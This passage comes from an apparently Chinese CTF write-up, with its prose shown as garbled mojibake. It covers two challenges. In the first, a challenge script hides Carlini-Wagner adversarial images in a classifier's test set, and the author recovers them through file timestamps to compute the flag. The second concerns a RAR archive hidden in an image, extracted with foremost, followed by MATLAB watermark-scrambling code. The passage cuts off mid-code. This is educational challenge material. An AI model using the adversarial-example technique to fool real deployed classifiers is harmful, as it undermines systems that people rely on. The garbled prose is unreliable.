†å›¾ç‰‡ï¼Œä¸€ä¸ªpythonè„šæœ¬ï¼Œè¿˜æœ‰ä¸€ä¸ªæ¨¡å‹</p><p>è¿™ç§AIé¢˜ç›®ç¬¬ä¸€æ¬¡é‡è§ï¼Œåˆšçœ‹åˆ°çš„æ—¶å€™æ²¡æœ‰ä»»ä½•å¤´ç»ªğŸ˜ª</p><p>è·Ÿç€åˆ«äººçš„wpå­¦ä¹ äº†ä¸€é</p><p>attack.pyæºç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> glob <span class="token keyword">import</span> glob<span class="token keyword">import</span> torch<span class="token keyword">from</span> torch <span class="token keyword">import</span> nn<span class="token punctuation">,</span> optim<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>functional <span class="token keyword">as</span> F<span class="token keyword">import</span> torchattacks <span class="token comment"># https://github.com/Harry24k/adversarial-attacks-pytorch</span><span class="token keyword">from</span> torchvision <span class="token keyword">import</span> transforms<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> random<span class="token keyword">import</span> os<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5<span class="token punctuation">,</span> sha256<span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>Model<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv1 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv1_bn <span class="token operator">=</span> nn<span class="token punctuation">.</span>BatchNorm2d<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>pool <span class="token operator">=</span> nn<span class="token punctuation">.</span>MaxPool2d<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv2 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv2_bn <span class="token operator">=</span> nn<span class="token punctuation">.</span>BatchNorm2d<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv3 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv3_bn <span class="token operator">=</span> nn<span class="token punctuation">.</span>BatchNorm2d<span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fc1 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span><span class="token number">250</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">350</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fc1_bn <span class="token operator">=</span> nn<span class="token punctuation">.</span>BatchNorm1d<span class="token punctuation">(</span><span class="token number">350</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fc2 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span><span class="token number">350</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>dropout <span class="token operator">=</span> nn<span class="token punctuation">.</span>Dropout<span class="token punctuation">(</span>p<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>pool<span class="token punctuation">(</span>F<span class="token punctuation">.</span>elu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv1<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>dropout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv1_bn<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>pool<span class="token punctuation">(</span>F<span class="token punctuation">.</span>elu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv2<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>dropout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv2_bn<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>pool<span class="token punctuation">(</span>F<span class="token punctuation">.</span>elu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv3<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>dropout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv3_bn<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> x<span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">250</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> F<span class="token punctuation">.</span>elu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc1<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>dropout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc1_bn<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>fc2<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">return</span> x<span class="token comment"># load pretrained model</span>device <span class="token operator">=</span> torch<span class="token punctuation">.</span>device<span class="token punctuation">(</span><span class="token string">"cuda:0"</span> <span class="token keyword">if</span> torch<span class="token punctuation">.</span>cuda<span class="token punctuation">.</span>is_available<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">"cpu"</span><span class="token punctuation">)</span>transform <span class="token operator">=</span> transforms<span class="token punctuation">.</span>ToTensor<span class="token punctuation">(</span><span class="token punctuation">)</span>model <span class="token operator">=</span> Model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>check_point <span class="token operator">=</span> torch<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">'model.pt'</span><span class="token punctuation">,</span> map_location<span class="token operator">=</span>device<span class="token punctuation">)</span>model<span class="token punctuation">.</span>load_state_dict<span class="token punctuation">(</span>check_point<span class="token punctuation">)</span>model<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># untargeted CW attack</span>atk <span class="token operator">=</span> torchattacks<span class="token punctuation">.</span>CW<span class="token punctuation">(</span>model<span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> kappa<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">)</span><span class="token comment"># generate an adversarial example for each class</span>pairs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> cl <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        origin_image <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>glob<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'test/</span><span class="token interpolation"><span class="token punctuation">{</span>cl<span class="token punctuation">}</span></span><span class="token string">/*.png'</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>        image <span class="token operator">=</span> transform<span class="token punctuation">(</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>origin_image<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>        label <span class="token operator">=</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span>cl<span class="token punctuation">,</span> device<span class="token operator">=</span>device<span class="token punctuation">)</span>        adv_image <span class="token operator">=</span> atk<span class="token punctuation">(</span>image<span class="token punctuation">,</span> label<span class="token punctuation">)</span>        origin_output <span class="token operator">=</span> model<span class="token punctuation">(</span>image<span class="token punctuation">)</span>        adv_output <span class="token operator">=</span> model<span class="token punctuation">(</span>adv_image<span class="token punctuation">)</span>        origin_label <span class="token operator">=</span> torch<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>origin_output<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span>        adv_label <span class="token operator">=</span> torch<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>adv_output<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> adv_label <span class="token operator">==</span> origin_label<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        transforms<span class="token punctuation">.</span>ToPILImage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>adv_image<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'adv_</span><span class="token interpolation"><span class="token punctuation">{</span>origin_label<span class="token punctuation">}</span></span><span class="token string">_</span><span class="token interpolation"><span class="token punctuation">{</span>adv_label<span class="token punctuation">}</span></span><span class="token string">.png'</span></span><span class="token punctuation">)</span>        <span class="token comment"># confirm that the generated adversarial example is working</span>        image <span class="token operator">=</span> transform<span class="token punctuation">(</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'adv_</span><span class="token interpolation"><span class="token punctuation">{</span>origin_label<span class="token punctuation">}</span></span><span class="token string">_</span><span class="token interpolation"><span class="token punctuation">{</span>adv_label<span class="token punctuation">}</span></span><span class="token string">.png'</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>        output <span class="token operator">=</span> model<span class="token punctuation">(</span>image<span class="token punctuation">)</span>        <span class="token keyword">if</span> torch<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>output<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> adv_label<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        pairs<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>origin_image<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'adv_</span><span class="token interpolation"><span class="token punctuation">{</span>origin_label<span class="token punctuation">}</span></span><span class="token string">_</span><span class="token interpolation"><span class="token punctuation">{</span>adv_label<span class="token punctuation">}</span></span><span class="token string">.png'</span></span><span class="token punctuation">,</span> origin_label<span class="token punctuation">,</span> adv_label<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token comment"># remove origin images and move adversarial examples into target classes</span><span class="token keyword">for</span> origin_fname<span class="token punctuation">,</span> adv_fname<span class="token punctuation">,</span> origin_label<span class="token punctuation">,</span> adv_label <span class="token keyword">in</span> pairs<span class="token punctuation">:</span>    os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span>adv_fname<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'test/</span><span class="token interpolation"><span class="token punctuation">{</span>adv_label<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>adv_fname<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>origin_fname<span class="token punctuation">)</span><span class="token comment"># shuffle all the images to hide adversarial examples</span>os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'imgs'</span><span class="token punctuation">)</span>adversarial_images <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> cl <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    images <span class="token operator">=</span> glob<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'test/</span><span class="token interpolation"><span class="token punctuation">{</span>cl<span class="token punctuation">}</span></span><span class="token string">/*.png'</span></span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'imgs/</span><span class="token interpolation"><span class="token punctuation">{</span>cl<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>images<span class="token punctuation">)</span>    <span class="token keyword">for</span> idx<span class="token punctuation">,</span> image <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>images<span class="token punctuation">)</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span>image<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'imgs/</span><span class="token interpolation"><span class="token punctuation">{</span>cl<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>idx<span class="token punctuation">}</span></span><span class="token string">.png'</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'adv'</span> <span class="token keyword">in</span> image<span class="token punctuation">:</span>            adversarial_images<span class="token punctuation">.</span>append<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token comment"># You can get the flag if you find all the adversarial examples :)</span>flag <span class="token operator">=</span> <span class="token string">'flag{'</span> <span class="token operator">+</span> md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>adversarial_images<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'}'</span><span class="token comment"># Give you some hints though you can solve this challenge without them</span>hint1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> pairs<span class="token punctuation">]</span>hint2 <span class="token operator">=</span> sha256<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>adversarial_images<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag:'</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hint1:'</span><span class="token punctuation">,</span> hint1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hint2:'</span><span class="token punctuation">,</span> hint2<span class="token punctuation">)</span><span class="token comment"># flag: flag{*********REDACTED**********}</span><span class="token comment"># hint1: [(0, 1), (1, 0), (2, 6), (3, 4), (4, 3), (5, 6), (6, 5), (7, 8), (8, 7), (9, 1)]</span><span class="token comment"># hint2: 502e0423b82c251f280e4c3261ee4d01dca4f6fe0b663817e9fd43dffefc5ce9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°æ‹¿pytorchæ­å»ºäº†ä¸€ä¸ªæ¨¡å‹ï¼Œç„¶åç”Ÿæˆå¯¹æŠ—æ ·æœ¬ï¼Œæ¥ç€æŠŠè¿™äº›æ ·æœ¬æ”¾åˆ°æ¨¡å‹çš„åˆ†ç±»ä¸­å»ï¼Œç„¶åå°†æ ·æœ¬ä¿å­˜ï¼Œæ”¹åç„¶ååˆ æ‰åŸå›¾</p><p>å› ä¸ºä¿®æ”¹æ–‡ä»¶åçš„åŸå› ï¼Œæˆ‘ä»¬è¦æ‰¾çš„æ ·æœ¬éƒ½æ˜¯åé¢é‡æ–°ä¿å­˜çš„ï¼Œæ‰€ä»¥å’Œå…¶ä»–æ–‡ä»¶çš„ç”Ÿæˆæ—¶é—´ä¸ä¸€æ ·ï¼ŒæŠŠè¿™äº›å›¾ç‰‡æŒ‰ç…§æ—¶é—´æ’åºå°±èƒ½æ‰¾åˆ°è¿™äº›æ ·æœ¬äº†</p><p>å½“ç„¶è¿™è‚¯å®šæ˜¯ä¸€ç§æŠ•æœºå–å·§çš„æ–¹æ³•äº†ï¼Œæ­£ç¡®çš„è§£æ³•å¤ªå¤æ‚ï¼Œæˆ‘ç›®å‰çš„æ°´å¹³è¿˜ç†è§£ä¸äº†</p><p>æ‰¾åˆ°æ ·æœ¬åé—®é¢˜å°±è¿åˆƒè€Œè§£äº†</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5<span class="token punctuation">,</span> sha256adversarial_images <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">273</span><span class="token punctuation">,</span> <span class="token number">293</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">391</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">]</span>hint2 <span class="token operator">=</span> sha256<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>adversarial_images<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hint2:'</span><span class="token punctuation">,</span> hint2<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">'flag{'</span> <span class="token operator">+</span> md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>adversarial_images<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'}'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag:'</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag{00d531934c171e1a71405f5e1f171d65}</p><h2 id="snowww"><a href="#snowww" class="headerlink" title="snowww"></a>snowww</h2><p>åˆ†æè¿™å¼ å›¾ç‰‡åå‘ç°æœ€åè—äº†ä¸€ä¸ªrarçš„å‹ç¼©åŒ…</p><p>foremostç›´æ¥æŠŠå‹ç¼©åŒ…æå–å‡ºæ¥</p><p>é‡Œè¾¹æœ‰ç”¨matlabå†™çš„ä»£ç ï¼Œç”±äºæ²¡æ¥è§¦è¿‡matlabï¼Œé‡Œé¢å¾ˆå¤šä»£ç éƒ½çœ‹ä¸æ‡‚</p><p>è¿™é‡Œæ‰¾åˆ°ä¸€ä½å¤§ç¥å†™çš„æ³¨é‡Š</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"># ä½œè€…<span class="token punctuation">(</span>Author<span class="token punctuation">)</span>ï¼šSnowywar# é“¾æ¥<span class="token punctuation">(</span>URL<span class="token punctuation">)</span>ï¼šhttp<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>snowywar<span class="token punctuation">.</span>top<span class="token operator">/</span>wordpress<span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">/</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">01</span><span class="token operator">/</span><span class="token number">31</span><span class="token operator">/</span>ichunqiu<span class="token operator">-</span>write<span class="token operator">-</span>up<span class="token operator">/</span><span class="token comment">%% Run on Matlab2012b </span>clc<span class="token punctuation">;</span>clear<span class="token punctuation">;</span>close all<span class="token punctuation">;</span>alpha <span class="token operator">=</span> <span class="token number">80</span><span class="token punctuation">;</span>im <span class="token operator">=</span> <span class="token function">double</span><span class="token punctuation">(</span><span class="token function">imread</span><span class="token punctuation">(</span><span class="token string">'original.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">255</span><span class="token punctuation">;</span>mark <span class="token operator">=</span> <span class="token function">double</span><span class="token punctuation">(</span><span class="token function">imread</span><span class="token punctuation">(</span><span class="token string">'watermark.png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">255</span><span class="token punctuation">;</span>imsize <span class="token operator">=</span> <span class="token function">size</span><span class="token punctuation">(</span>im<span class="token punctuation">)</span><span class="token punctuation">;</span>TH<span class="token operator">=</span><span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>TH1 <span class="token operator">=</span> TH<span class="token punctuation">;</span><span class="token function">TH1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">size</span><span class="token punctuation">(</span>mark<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">size</span><span class="token punctuation">(</span>mark<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span> <span class="token operator">=</span> mark<span class="token punctuation">;</span>M<span class="token operator">=</span><span class="token function">randperm</span><span class="token punctuation">(</span><span class="token number">0.5</span><span class="token operator">*</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">%%è·å¾—1080çš„ä¸€åŠé•¿åº¦çš„éšæœºæ•°ç»„ï¼Œ0-540ä¸ªéšæœºæ•°ï¼Œå…±540</span>N<span class="token operator">=</span><span class="token function">randperm</span><span class="token punctuation">(</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">%%å…±1920ä¸ªéšæœºæ•°ï¼Œ0-1920</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token string">'encode.mat'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">%%mã€nå­˜å…¥encode.mat</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span>                       <span class="token comment">%%å¾ªç¯ï¼Œ1åˆ°540å¾ªç¯å…±540æ¬¡</span>    <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                       <span class="token comment">%%1-1920å¾ªç¯</span>         <span class="token function">TH</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">TH1</span><span class="token punctuation">(</span><span class="token function">M</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">N</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">%%æ„ä¹‰ä¸æ˜çš„èµ‹å€¼</span>    <span class="token keyword">end</span><span class="token keyword">end</span>mark_ <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">%%åˆ›å»º1080 1920 3çš„å…¨0çŸ©é˜µ</span><span class="token function">mark_</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">=</span>TH<span class="token punctuation">;</span>    <span class="token comment">%%THèµ‹å€¼ç»™ä¸‰ç»´çŸ©é˜µ</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span>                          <span class="token comment">%%1-540</span>    <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                          <span class="token comment">%%1-1920</span>        <span class="token function">mark_</span><span class="token punctuation">(</span><span class="token function">imsize</span><span class="token 